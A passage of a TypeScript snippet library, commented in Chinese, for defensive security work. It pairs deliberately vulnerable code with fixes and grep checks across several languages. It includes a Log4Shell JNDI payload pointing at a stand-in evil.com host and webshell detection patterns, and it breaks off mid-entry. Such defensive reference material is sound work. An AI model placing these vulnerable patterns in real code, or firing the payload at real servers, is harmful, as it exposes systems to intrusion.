/**
 * 安全速查 -- 漏洞修复代码片段库
 * 面向线下应急响应 / CTF 防御比赛，一键复制快速封堵漏洞
 */

export interface SecFixSnippet {
  id: string;
  lang: string;
  vuln: string;
  title: string;
  desc: string;
  bad?: string;
  fix: string;
  oneliner?: string;
  tags: string[];
}

// ═══════════════════════════════════════
// Python
// ═══════════════════════════════════════
const python: SecFixSnippet[] = [
  {
    id: 'py-sqli', lang: 'Python', vuln: 'SQL注入', title: 'SQL注入 -- 参数化查询',
    desc: '禁止拼接SQL，改用参数化查询',
    bad: `cursor.execute("SELECT * FROM users WHERE id=" + user_id)`,
    fix: `cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))`,
    oneliner: `grep -rn 'execute.*".*+' --include='*.py' .`,
    tags: ['sqli', 'sql', 'injection', '注入'],
  },
  {
    id: 'py-cmdi', lang: 'Python', vuln: '命令注入', title: '命令注入 -- 禁用shell=True',
    desc: 'os.system / subprocess shell=True 导致命令注入',
    bad: `os.system("ping " + ip)\nsubprocess.call("ls " + path, shell=True)`,
    fix: `import shlex, subprocess\nsubprocess.call(["ping", "-c", "1", shlex.quote(ip)])\nsubprocess.call(["ls", path])  # 不用 shell=True`,
    oneliner: `grep -rn 'os\\.system\\|shell=True' --include='*.py' .`,
    tags: ['command', 'injection', 'rce', 'os.system', 'subprocess'],
  },
  {
    id: 'py-ssti', lang: 'Python', vuln: 'SSTI', title: 'SSTI -- Jinja2模板注入',
    desc: 'Flask render_template_string 直接渲染用户输入',
    bad: `return render_template_string(request.args.get('name'))`,
    fix: `from markupsafe import escape\nreturn render_template_string("Hello {{ name }}", name=request.args.get('name'))\n# 或直接转义\nreturn f"Hello {escape(request.args.get('name'))}"`,
    oneliner: `grep -rn 'render_template_string' --include='*.py' .`,
    tags: ['ssti', 'template', 'jinja', 'flask'],
  },
  {
    id: 'py-path', lang: 'Python', vuln: '路径穿越', title: '路径穿越 -- realpath检查',
    desc: '文件操作未过滤 ../ 导致任意文件读取',
    bad: `open('/uploads/' + filename)`,
    fix: `import os\nsafe = os.path.realpath(os.path.join('/uploads', filename))\nif not safe.startswith('/uploads/'):\n    abort(403)\nopen(safe)`,
    oneliner: `grep -rn "open.*\\+.*request\\|open.*format.*request" --include='*.py' .`,
    tags: ['path', 'traversal', 'lfi', '目录穿越'],
  },
  {
    id: 'py-pickle', lang: 'Python', vuln: '反序列化', title: 'Pickle反序列化RCE',
    desc: 'pickle.loads 可执行任意代码',
    bad: `data = pickle.loads(request.data)`,
    fix: `import json\ndata = json.loads(request.data)  # 用JSON替代pickle\n\n# 必须用pickle时，白名单限制:\nimport io, pickle\nclass SafeUnpickler(pickle.Unpickler):\n    def find_class(self, module, name):\n        raise pickle.UnpicklingError("blocked")\ndata = SafeUnpickler(io.BytesIO(request.data)).load()`,
    oneliner: `grep -rn 'pickle\\.loads\\|pickle\\.load(' --include='*.py' .`,
    tags: ['pickle', 'deserialize', '反序列化', 'rce'],
  },
  {
    id: 'py-eval', lang: 'Python', vuln: '代码执行', title: 'eval/exec 代码执行',
    desc: 'eval() 直接执行用户输入',
    bad: `result = eval(request.args.get('expr'))`,
    fix: `import ast\nresult = ast.literal_eval(request.args.get('expr'))\n\n# 或白名单:\nimport re\nexpr = request.args.get('expr')\nif not re.match(r'^[\\d+\\-*/().\\s]+$', expr):\n    abort(400)`,
    oneliner: `grep -rn 'eval(\\|exec(' --include='*.py' . | grep -v '#'`,
    tags: ['eval', 'exec', 'rce', '代码执行'],
  },
  {
    id: 'py-ssrf', lang: 'Python', vuln: 'SSRF', title: 'SSRF -- URL白名单',
    desc: '服务端请求伪造，可访问内网',
    bad: `resp = requests.get(request.args.get('url'))`,
    fix: `from urllib.parse import urlparse\nimport ipaddress\nurl = request.args.get('url')\nparsed = urlparse(url)\ntry:\n    ip = ipaddress.ip_address(parsed.hostname)\n    if ip.is_private or ip.is_loopback:\n        abort(403)\nexcept ValueError:\n    pass  # hostname不是IP\nblocked = ['localhost', '0.0.0.0', '169.254.169.254']\nif parsed.hostname in blocked:\n    abort(403)\nresp = requests.get(url, timeout=5, allow_redirects=False)`,
    oneliner: `grep -rn 'requests\\.get.*request\\.' --include='*.py' .`,
    tags: ['ssrf', '请求伪造', 'requests'],
  },
  {
    id: 'py-upload', lang: 'Python', vuln: '文件上传', title: '文件上传 -- 后缀白名单',
    desc: '未限制上传文件类型导致WebShell',
    bad: `f = request.files['file']\nf.save('/uploads/' + f.filename)`,
    fix: `import os\nfrom werkzeug.utils import secure_filename\nALLOWED = {'.jpg','.png','.gif','.pdf','.txt'}\nf = request.files['file']\nfname = secure_filename(f.filename)\next = os.path.splitext(fname)[1].lower()\nif ext not in ALLOWED:\n    abort(400)\nf.save(os.path.join('/uploads', fname))`,
    oneliner: `grep -rn 'save.*filename' --include='*.py' .`,
    tags: ['upload', 'webshell', '文件上传'],
  },
  {
    id: 'py-xxe', lang: 'Python', vuln: 'XXE', title: 'Python XML外部实体注入',
    desc: 'lxml/xml.etree解析外部实体',
    bad: `from lxml import etree\ntree = etree.parse(user_xml)`,
    fix: `from lxml import etree\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\ntree = etree.parse(user_xml, parser)\n\n# 或用defusedxml:\nimport defusedxml.ElementTree as ET\ntree = ET.parse(user_xml)`,
    oneliner: `grep -rn 'etree\\.parse\\|xml\\.etree.*parse\\|minidom\\.parse' --include='*.py' .`,
    tags: ['xxe', 'xml', '外部实体'],
  },
  {
    id: 'py-flask-debug', lang: 'Python', vuln: '信息泄露', title: 'Flask关闭Debug模式',
    desc: 'Debug模式暴露源码和Werkzeug控制台',
    bad: `app.run(debug=True)`,
    fix: `app.run(debug=False)\n# 同时禁用PIN:\n# 删除环境变量 WERKZEUG_DEBUG_PIN`,
    oneliner: `grep -rn 'debug=True\\|DEBUG.*=.*True' --include='*.py' .`,
    tags: ['debug', 'flask', 'werkzeug', '信息泄露'],
  },
  {
    id: 'py-yaml', lang: 'Python', vuln: '反序列化', title: 'YAML反序列化RCE',
    desc: 'yaml.load 可执行任意Python对象',
    bad: `data = yaml.load(user_input)`,
    fix: `data = yaml.safe_load(user_input)`,
    oneliner: `grep -rn 'yaml\\.load(' --include='*.py' . | grep -v safe_load`,
    tags: ['yaml', 'deserialize', 'rce'],
  },
];

// ═══════════════════════════════════════
// PHP
// ═══════════════════════════════════════
const php: SecFixSnippet[] = [
  {
    id: 'php-sqli', lang: 'PHP', vuln: 'SQL注入', title: 'SQL注入 -- PDO预处理',
    desc: '禁止拼接SQL，使用PDO预处理语句',
    bad: `$sql = "SELECT * FROM users WHERE id=" . $_GET['id'];`,
    fix: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");\n$stmt->execute([$_GET['id']]);`,
    oneliner: `grep -rn '\\$_GET\\|\\$_POST\\|\\$_REQUEST' --include='*.php' . | grep -i 'select\\|insert\\|update\\|delete'`,
    tags: ['sqli', 'sql', 'injection', '注入', 'pdo'],
  },
  {
    id: 'php-cmdi', lang: 'PHP', vuln: '命令注入', title: '命令注入 -- escapeshellarg',
    desc: 'system/exec/passthru等函数未过滤输入',
    bad: `system("ping " . $_GET['ip']);`,
    fix: `$ip = escapeshellarg($_GET['ip']);\nsystem("ping -c 1 " . $ip);`,
    oneliner: `grep -rn 'system(\\|exec(\\|passthru(\\|shell_exec(\\|popen(\\|proc_open(' --include='*.php' .`,
    tags: ['command', 'injection', 'rce', 'system', 'exec'],
  },
  {
    id: 'php-lfi', lang: 'PHP', vuln: '文件包含', title: '文件包含 -- 白名单',
    desc: 'include/require 包含用户可控路径',
    bad: `include($_GET['page'] . '.php');`,
    fix: `$allowed = ['home','about','contact'];\n$page = $_GET['page'] ?? 'home';\nif (!in_array($page, $allowed)) die('Forbidden');\ninclude($page . '.php');`,
    oneliner: `grep -rn 'include.*\\$_\\|require.*\\$_' --include='*.php' .`,
    tags: ['lfi', 'rfi', 'include', '文件包含'],
  },
  {
    id: 'php-upload', lang: 'PHP', vuln: '文件上传', title: '文件上传 -- 严格校验',
    desc: '未校验上传文件类型，可上传WebShell',
    bad: `move_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $_FILES['f']['name']);`,
    fix: `$allowed_ext = ['jpg','png','gif','pdf'];\n$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));\n$mime = mime_content_type($_FILES['f']['tmp_name']);\nif (!in_array($ext, $allowed_ext)) die('Forbidden');\n$newname = md5(uniqid()) . '.' . $ext;\nmove_uploaded_file($_FILES['f']['tmp_name'], 'uploads/' . $newname);`,
    oneliner: `grep -rn 'move_uploaded_file' --include='*.php' .`,
    tags: ['upload', 'webshell', '文件上传'],
  },
  {
    id: 'php-deser', lang: 'PHP', vuln: '反序列化', title: 'unserialize -- 禁用户输入',
    desc: 'unserialize()反序列化用户输入导致RCE',
    bad: `$obj = unserialize($_COOKIE['data']);`,
    fix: `$obj = json_decode($_COOKIE['data'], true);\n\n// 如果必须:\n$obj = unserialize($_COOKIE['data'], ['allowed_classes' => false]);`,
    oneliner: `grep -rn 'unserialize' --include='*.php' .`,
    tags: ['deserialize', 'unserialize', '反序列化', 'rce'],
  },
  {
    id: 'php-xss', lang: 'PHP', vuln: 'XSS', title: 'XSS -- htmlspecialchars',
    desc: '输出未转义导致XSS',
    bad: `echo "Hello " . $_GET['name'];`,
    fix: `echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');`,
    oneliner: `grep -rn 'echo.*\\$_GET\\|echo.*\\$_POST' --include='*.php' .`,
    tags: ['xss', '跨站脚本'],
  },
  {
    id: 'php-disable', lang: 'PHP', vuln: '加固', title: 'php.ini -- 禁用危险函数(比赛首选)',
    desc: '通过php.ini禁用高危函数，比赛开局第一步',
    fix: `; /etc/php.ini 或 /etc/php/X.X/fpm/php.ini\ndisable_functions = system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec,eval,assert,preg_replace,create_function,call_user_func,call_user_func_array,array_map,array_filter,usort,putenv,dl\nallow_url_include = Off\nallow_url_fopen = Off\nexpose_php = Off\ndisplay_errors = Off\nopen_basedir = /var/www/html:/tmp`,
    oneliner: `echo 'disable_functions = system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec,eval,assert' >> /etc/php.ini && systemctl restart php-fpm`,
    tags: ['disable_functions', 'php.ini', 'waf', '禁用函数', '加固'],
  },
  {
    id: 'php-backdoor', lang: 'PHP', vuln: '后门查杀', title: '一键查找PHP后门',
    desc: '搜索常见WebShell特征',
    fix: "# 查找可疑eval/assert/base64\ngrep -rn 'eval(\\|assert(\\|base64_decode(\\|gzinflate(\\|gzuncompress(\\|str_rot13(' --include='*.php' /var/www\n\n# 查找变量函数调用\ngrep -rn '\\$_POST\\[.*\\](\\$_\\|\\$_GET\\[.*\\](\\$_\\|${\\$' --include='*.php' /var/www\n\n# 查找最近修改的PHP\nfind /var/www -name '*.php' -mmin -60\n\n# 查找隐藏文件\nfind /var/www -name '.*' -type f\nfind /var/www -name '*.php*' ! -name '*.php'\n\n# 查找异常大/小文件\nfind /var/www -name '*.php' -size +100k\nfind /var/www -name '*.php' -size -10c",
    oneliner: `grep -rl 'eval(\\|base64_decode(\\|assert(' --include='*.php' /var/www`,
    tags: ['webshell', 'backdoor', '后门', '查杀', 'webshell查杀'],
  },
  {
    id: 'php-session', lang: 'PHP', vuln: '会话安全', title: 'Session固定/劫持防护',
    desc: '登录后重新生成session id',
    bad: `// 登录成功后直接使用旧session`,
    fix: `// 登录成功后:\nsession_regenerate_id(true);\n\n// php.ini 加固:\n// session.cookie_httponly = 1\n// session.cookie_secure = 1\n// session.use_strict_mode = 1`,
    oneliner: `grep -rn 'session_start' --include='*.php' . | head -10`,
    tags: ['session', '会话', '固定', '劫持'],
  },
  {
    id: 'php-ssrf', lang: 'PHP', vuln: 'SSRF', title: 'PHP SSRF -- curl过滤',
    desc: 'file_get_contents/curl_exec请求用户URL',
    bad: `$data = file_get_contents($_GET['url']);`,
    fix: `$url = $_GET['url'];\n$parsed = parse_url($url);\n$ip = gethostbyname($parsed['host']);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    die('Forbidden');\n}\n$data = file_get_contents($url);`,
    oneliner: `grep -rn 'file_get_contents.*\\$_\\|curl_exec' --include='*.php' .`,
    tags: ['ssrf', 'curl', 'file_get_contents'],
  },
];

// ═══════════════════════════════════════
// Java
// ═══════════════════════════════════════
const java: SecFixSnippet[] = [
  {
    id: 'java-sqli', lang: 'Java', vuln: 'SQL注入', title: 'SQL注入 -- PreparedStatement',
    desc: '禁止String拼接SQL',
    bad: `stmt.executeQuery("SELECT * FROM users WHERE id=" + id);`,
    fix: `PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id=?");\nps.setString(1, id);\nResultSet rs = ps.executeQuery();`,
    oneliner: `grep -rn 'createStatement\\|executeQuery.*+\\|execute.*+' --include='*.java' .`,
    tags: ['sqli', 'sql', 'injection', 'preparedstatement'],
  },
  {
    id: 'java-deser', lang: 'Java', vuln: '反序列化', title: 'Java反序列化 -- 白名单过滤',
    desc: 'ObjectInputStream可导致RCE(CC链/CB链)',
    bad: `ObjectInputStream ois = new ObjectInputStream(in);\nObject obj = ois.readObject();`,
    fix: `// 白名单ObjectInputStream:\npublic class SafeOIS extends ObjectInputStream {\n    private static final Set<String> ALLOWED = Set.of(\n        "java.lang.String", "java.util.ArrayList", "java.util.HashMap");\n    public SafeOIS(InputStream in) throws IOException { super(in); }\n    @Override\n    protected Class<?> resolveClass(ObjectStreamClass desc)\n            throws IOException, ClassNotFoundException {\n        if (!ALLOWED.contains(desc.getName()))\n            throw new InvalidClassException("Blocked", desc.getName());\n        return super.resolveClass(desc);\n    }\n}`,
    oneliner: `grep -rn 'ObjectInputStream\\|readObject()\\|readUnshared()' --include='*.java' .`,
    tags: ['deserialize', '反序列化', 'rce', 'ysoserial', 'cc链'],
  },
  {
    id: 'java-xxe', lang: 'Java', vuln: 'XXE', title: 'XXE -- 禁用外部实体',
    desc: 'XML解析未禁用外部实体',
    bad: `DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocument doc = dbf.newDocumentBuilder().parse(input);`,
    fix: `DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\ndbf.setFeature("http://xml.org/sax/features/external-general-entities", false);\ndbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);\ndbf.setXIncludeAware(false);\ndbf.setExpandEntityReferences(false);\nDocument doc = dbf.newDocumentBuilder().parse(input);`,
    oneliner: `grep -rn 'DocumentBuilderFactory\\|SAXParserFactory\\|XMLInputFactory' --include='*.java' .`,
    tags: ['xxe', 'xml', '外部实体'],
  },
  {
    id: 'java-ssrf', lang: 'Java', vuln: 'SSRF', title: 'SSRF -- 内网地址过滤',
    desc: '服务端请求用户可控URL',
    bad: `URL url = new URL(request.getParameter("url"));\nInputStream is = url.openStream();`,
    fix: `String urlStr = request.getParameter("url");\nURL url = new URL(urlStr);\nInetAddress addr = InetAddress.getByName(url.getHost());\nif (addr.isLoopbackAddress() || addr.isSiteLocalAddress()\n    || addr.isLinkLocalAddress() || addr.isAnyLocalAddress()) {\n    throw new SecurityException("blocked");\n}`,
    oneliner: `grep -rn 'new URL(.*getParameter\\|openStream\\|openConnection' --include='*.java' .`,
    tags: ['ssrf', 'url'],
  },
  {
    id: 'java-spel', lang: 'Java', vuln: 'SpEL注入', title: 'Spring SpEL注入',
    desc: 'SpEL表达式注入可执行任意代码',
    bad: `ExpressionParser parser = new SpelExpressionParser();\nparser.parseExpression(userInput).getValue();`,
    fix: `SimpleEvaluationContext ctx = SimpleEvaluationContext\n    .forReadOnlyDataBinding().build();\nparser.parseExpression(userInput).getValue(ctx);`,
    oneliner: `grep -rn 'SpelExpressionParser\\|parseExpression' --include='*.java' .`,
    tags: ['spel', 'spring', '表达式注入'],
  },
  {
    id: 'java-log4j', lang: 'Java', vuln: 'Log4Shell', title: 'Log4j2 JNDI注入(CVE-2021-44228)',
    desc: 'Log4j2 lookup导致远程代码执行',
    bad: "logger.info(\"User: \" + userInput);  // userInput=${jndi:ldap://evil.com/a}",
    fix: `# 临时缓解(JVM参数):\n-Dlog4j2.formatMsgNoLookups=true\n\n# 环境变量:\nLOG4J_FORMAT_MSG_NO_LOOKUPS=true\n\n# 升级到 >= 2.17.0:\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.17.1</version>\n</dependency>\n\n# 删除JndiLookup类(不能升级时):\nzip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`,
    oneliner: `find / -name 'log4j-core-*.jar' 2>/dev/null && grep -r 'log4j' --include='pom.xml' --include='build.gradle' .`,
    tags: ['log4j', 'log4shell', 'jndi', 'cve-2021-44228', 'rce'],
  },
  {
    id: 'java-path', lang: 'Java', vuln: '路径穿越', title: 'Java路径穿越',
    desc: '文件操作未规范化路径',
    bad: `File f = new File(BASE_DIR + request.getParameter("file"));`,
    fix: `String name = request.getParameter("file");\nFile f = new File(BASE_DIR, name).getCanonicalFile();\nif (!f.toPath().startsWith(Paths.get(BASE_DIR))) {\n    throw new SecurityException("Path traversal blocked");\n}`,
    oneliner: `grep -rn 'new File.*getParameter\\|new File.*request' --include='*.java' .`,
    tags: ['path', 'traversal', 'lfi'],
  },
  {
    id: 'java-cmdi', lang: 'Java', vuln: '命令注入', title: 'Runtime.exec命令注入',
    desc: 'Runtime.getRuntime().exec 拼接用户输入',
    bad: `Runtime.getRuntime().exec("ping " + host);`,
    fix: `// 使用数组形式，不经过shell:\nRuntime.getRuntime().exec(new String[]{"ping", "-c", "1", host});\n\n// 或ProcessBuilder:\nnew ProcessBuilder("ping", "-c", "1", host).start();`,
    oneliner: `grep -rn 'Runtime.*exec\\|ProcessBuilder' --include='*.java' .`,
    tags: ['command', 'injection', 'rce', 'runtime'],
  },
  {
    id: 'java-fastjson', lang: 'Java', vuln: '反序列化', title: 'Fastjson反序列化RCE',
    desc: 'Fastjson autoType导致RCE',
    bad: `JSON.parseObject(userInput);  // 包含@type字段`,
    fix: `// 升级Fastjson到安全版本(>=1.2.83或用Fastjson2)\n// 关闭autoType:\nParserConfig.getGlobalInstance().setSafeMode(true);\n\n// 或迁移到Jackson/Gson:\nObjectMapper mapper = new ObjectMapper();\nmapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);`,
    oneliner: `grep -rn 'JSON.parseObject\\|JSON.parse(' --include='*.java' . && grep -r 'fastjson' --include='pom.xml' .`,
    tags: ['fastjson', '反序列化', 'autotype', 'rce'],
  },
];

// ═══════════════════════════════════════
// JavaScript / Node.js
// ═══════════════════════════════════════
const javascript: SecFixSnippet[] = [
  {
    id: 'js-proto', lang: 'JavaScript', vuln: '原型链污染', title: '原型链污染 -- 安全合并',
    desc: 'lodash.merge/递归赋值导致原型链污染',
    bad: `function merge(t, s) { for (let k in s) t[k] = s[k]; }`,
    fix: `function safeMerge(t, s) {\n  for (let k of Object.keys(s)) {\n    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;\n    if (typeof s[k] === 'object' && s[k] !== null && !Array.isArray(s[k])) {\n      t[k] = safeMerge(t[k] || {}, s[k]);\n    } else { t[k] = s[k]; }\n  }\n  return t;\n}`,
    oneliner: `grep -rn '__proto__\\|constructor.*prototype' --include='*.js' . | grep -v node_modules`,
    tags: ['prototype', 'pollution', '原型链'],
  },
  {
    id: 'js-cmdi', lang: 'JavaScript', vuln: '命令注入', title: 'Node.js命令注入',
    desc: 'child_process.exec拼接用户输入',
    bad: `const { exec } = require('child_process');\nexec('ping ' + req.query.host);`,
    fix: `const { execFile } = require('child_process');\nexecFile('ping', ['-c', '1', req.query.host], (err, stdout) => {\n  res.send(stdout);\n});`,
    oneliner: `grep -rn 'exec(\\|execSync(' --include='*.js' --include='*.ts' . | grep -v node_modules`,
    tags: ['command', 'injection', 'rce', 'exec', 'child_process'],
  },
  {
    id: 'js-xss', lang: 'JavaScript', vuln: 'XSS', title: 'DOM XSS -- innerHTML替换',
    desc: 'innerHTML直接插入用户输入',
    bad: `element.innerHTML = userInput;`,
    fix: `element.textContent = userInput;\n// 或用DOMPurify:\nconst clean = DOMPurify.sanitize(userInput);\nelement.innerHTML = clean;`,
    oneliner: `grep -rn 'innerHTML.*=.*req\\|innerHTML.*=.*param\\|\\.html(.*req' --include='*.js' . | grep -v node_modules`,
    tags: ['xss', 'dom', 'innerHTML'],
  },
  {
    id: 'js-nosqli', lang: 'JavaScript', vuln: 'NoSQL注入', title: 'MongoDB NoSQL注入',
    desc: 'MongoDB查询直接使用用户输入($gt/$ne注入)',
    bad: `db.users.find({ user: req.body.user, pass: req.body.pass });`,
    fix: `const user = String(req.body.user || '');\nconst pass = String(req.body.pass || '');\ndb.users.find({ user, pass });\n\n// 或用mongo-sanitize:\nconst sanitize = require('mongo-sanitize');\ndb.users.find({ user: sanitize(req.body.user) });`,
    oneliner: `grep -rn 'find({.*req\\.body\\|find({.*req\\.query\\|findOne.*req\\.' --include='*.js' .`,
    tags: ['nosql', 'mongodb', 'injection'],
  },
  {
    id: 'js-path', lang: 'JavaScript', vuln: '路径穿越', title: 'Node.js路径穿越',
    desc: 'express静态文件/sendFile路径穿越',
    bad: `res.sendFile('/uploads/' + req.params.name);`,
    fix: `const path = require('path');\nconst name = path.normalize(req.params.name).replace(/^(\\.[\\\\/])+/, '');\nconst full = path.join('/uploads', name);\nif (!full.startsWith('/uploads/')) return res.status(403).end();\nres.sendFile(full);`,
    oneliner: `grep -rn 'sendFile.*req\\|readFile.*req\\|createReadStream.*req' --include='*.js' . | grep -v node_modules`,
    tags: ['path', 'traversal', 'lfi', 'sendFile'],
  },
  {
    id: 'js-jwt', lang: 'JavaScript', vuln: '认证绕过', title: 'JWT算法混淆/none攻击',
    desc: 'JWT验证未锁定算法',
    bad: `jwt.verify(token, secret);  // 未指定算法`,
    fix: `jwt.verify(token, secret, { algorithms: ['HS256'] });\n// 永远不要用 RS256 公钥作为 HS256 的 secret`,
    oneliner: `grep -rn 'jwt\\.verify\\|jsonwebtoken' --include='*.js' --include='*.ts' . | grep -v node_modules`,
    tags: ['jwt', 'token', '认证', 'algorithm'],
  },
  {
    id: 'js-ssti', lang: 'JavaScript', vuln: 'SSTI', title: 'Node.js模板注入(EJS/Pug)',
    desc: 'EJS/Pug模板引擎注入',
    bad: `res.render('index', { title: req.query.name });  // EJS: <%- title %>`,
    fix: `// EJS中使用 <%= %> 而不是 <%- %>\n// <%= %> 会自动转义HTML\n// <%- %> 不转义(危险)\n\n// 或手动转义:\nconst esc = s => s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[c]));\nres.render('index', { title: esc(req.query.name) });`,
    oneliner: `grep -rn '<%- ' --include='*.ejs' .`,
    tags: ['ssti', 'ejs', 'pug', 'template'],
  },
];

// ═══════════════════════════════════════
// Go
// ═══════════════════════════════════════
const golang: SecFixSnippet[] = [
  {
    id: 'go-sqli', lang: 'Go', vuln: 'SQL注入', title: 'SQL注入 -- 参数化查询',
    desc: 'fmt.Sprintf拼接SQL',
    bad: `query := fmt.Sprintf("SELECT * FROM users WHERE id='%s'", id)\ndb.Query(query)`,
    fix: `db.Query("SELECT * FROM users WHERE id=?", id)`,
    oneliner: `grep -rn 'Sprintf.*SELECT\\|Sprintf.*INSERT\\|Sprintf.*UPDATE\\|Sprintf.*DELETE' --include='*.go' .`,
    tags: ['sqli', 'sql', 'injection'],
  },
  {
    id: 'go-cmdi', lang: 'Go', vuln: '命令注入', title: '命令注入 -- 禁用sh -c',
    desc: 'exec.Command("sh", "-c", userInput)导致注入',
    bad: `cmd := exec.Command("sh", "-c", "ping "+ip)`,
    fix: `cmd := exec.Command("ping", "-c", "1", ip)`,
    oneliner: `grep -rn 'exec.Command.*sh.*-c\\|exec.Command.*bash.*-c' --include='*.go' .`,
    tags: ['command', 'injection', 'rce'],
  },
  {
    id: 'go-path', lang: 'Go', vuln: '路径穿越', title: '路径穿越 -- filepath.Clean',
    desc: '文件读取未过滤../',
    bad: `http.ServeFile(w, r, "/data/" + r.URL.Query().Get("file"))`,
    fix: `name := filepath.Clean(r.URL.Query().Get("file"))\nfull := filepath.Join("/data", name)\nif !strings.HasPrefix(full, "/data/") {\n    http.Error(w, "Forbidden", 403); return\n}\nhttp.ServeFile(w, r, full)`,
    oneliner: `grep -rn 'ServeFile.*Query\\|ReadFile.*Query\\|os.Open.*Query' --include='*.go' .`,
    tags: ['path', 'traversal', 'lfi'],
  },
  {
    id: 'go-ssti', lang: 'Go', vuln: 'SSTI', title: 'Go模板注入',
    desc: 'html/template vs text/template',
    bad: `import "text/template"\ntmpl, _ := template.New("t").Parse(userInput)\ntmpl.Execute(w, data)`,
    fix: `import "html/template"  // 用html/template自动转义\ntmpl, _ := template.New("t").Parse("Hello {{.Name}}")\ntmpl.Execute(w, data)  // 不要把用户输入当模板`,
    oneliner: `grep -rn 'text/template' --include='*.go' .`,
    tags: ['ssti', 'template', 'xss'],
  },
  {
    id: 'go-ssrf', lang: 'Go', vuln: 'SSRF', title: 'Go SSRF防护',
    desc: 'http.Get请求用户URL',
    bad: `resp, _ := http.Get(r.URL.Query().Get("url"))`,
    fix: `u, err := url.Parse(r.URL.Query().Get("url"))\nif err != nil { http.Error(w, "bad url", 400); return }\naddrs, _ := net.LookupHost(u.Hostname())\nfor _, a := range addrs {\n    ip := net.ParseIP(a)\n    if ip.IsLoopback() || ip.IsPrivate() {\n        http.Error(w, "blocked", 403); return\n    }\n}\nclient := &http.Client{Timeout: 5 * time.Second}\nresp, _ := client.Get(u.String())`,
    oneliner: `grep -rn 'http\\.Get.*Query\\|http\\.Post.*Query' --include='*.go' .`,
    tags: ['ssrf', 'http'],
  },
];

// ═══════════════════════════════════════
// C/C++
// ═══════════════════════════════════════
const c_cpp: SecFixSnippet[] = [
  {
    id: 'c-bof', lang: 'C/C++', vuln: '缓冲区溢出', title: '栈溢出 -- 安全函数替换',
    desc: 'gets/strcpy/sprintf等无边界检查',
    bad: `char buf[64];\ngets(buf);        // 无长度限制\nstrcpy(buf, src); // 无边界检查\nsprintf(buf, "%s", src);`,
    fix: `char buf[64];\nfgets(buf, sizeof(buf), stdin);\nstrncpy(buf, src, sizeof(buf)-1); buf[sizeof(buf)-1]='\\0';\nsnprintf(buf, sizeof(buf), "%s", src);`,
    oneliner: `grep -rn 'gets(\\|strcpy(\\|sprintf(\\|strcat(' --include='*.c' --include='*.cpp' .`,
    tags: ['buffer', 'overflow', '溢出', 'gets', 'strcpy'],
  },
  {
    id: 'c-fmt', lang: 'C/C++', vuln: '格式化字符串', title: '格式化字符串漏洞',
    desc: 'printf(user_input)导致信息泄露/任意写',
    bad: `printf(user_input);  // 可用%x泄露栈, %n写内存`,
    fix: `printf("%s", user_input);`,
    oneliner: `grep -rn 'printf(\\s*[a-z]\\|fprintf(.*,\\s*[a-z]' --include='*.c' --include='*.cpp' .`,
    tags: ['format', 'string', '格式化字符串', 'printf'],
  },
  {
    id: 'c-int', lang: 'C/C++', vuln: '整数溢出', title: '整数溢出 -- 边界检查',
    desc: '整数溢出导致缓冲区分配不足',
    bad: `size_t total = count * size;  // 可能溢出\nchar *buf = malloc(total);`,
    fix: `if (count > 0 && size > SIZE_MAX / count) {\n    return -1;  // 溢出\n}\nsize_t total = count * size;\nchar *buf = malloc(total);`,
    oneliner: `grep -rn 'malloc.*\\*' --include='*.c' --include='*.cpp' .`,
    tags: ['integer', 'overflow', '整数溢出'],
  },
];

// ═══════════════════════════════════════
// Shell / 系统加固
// ═══════════════════════════════════════
const shell: SecFixSnippet[] = [
  {
    id: 'sh-ssh', lang: 'Shell', vuln: 'SSH加固', title: 'SSH安全配置',
    desc: '禁止root登录、限制认证方式',
    fix: `# /etc/ssh/sshd_config\nPermitRootLogin no\nPasswordAuthentication no\nMaxAuthTries 3\nAllowUsers deploy\nProtocol 2\nClientAliveInterval 300\nClientAliveCountMax 2`,
    oneliner: `sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config && systemctl restart sshd`,
    tags: ['ssh', 'sshd', '加固'],
  },
  {
    id: 'sh-firewall', lang: 'Shell', vuln: '防火墙', title: 'iptables快速封堵',
    desc: '快速封禁IP、限制端口',
    fix: `# 封禁单个IP\niptables -I INPUT -s 1.2.3.4 -j DROP\n\n# 只开放22/80/443\niptables -P INPUT DROP\niptables -A INPUT -i lo -j ACCEPT\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\n# 防SYN Flood\niptables -A INPUT -p tcp --syn -m limit --limit 10/s -j ACCEPT\n\n# 持久化\niptables-save > /etc/iptables.rules`,
    oneliner: `iptables -I INPUT -s ATTACKER_IP -j DROP`,
    tags: ['iptables', 'firewall', '防火墙', '封禁'],
  },
  {
    id: 'sh-audit', lang: 'Shell', vuln: '应急排查', title: '应急排查一条龙',
    desc: '快速排查后门、异常进程、定时任务',
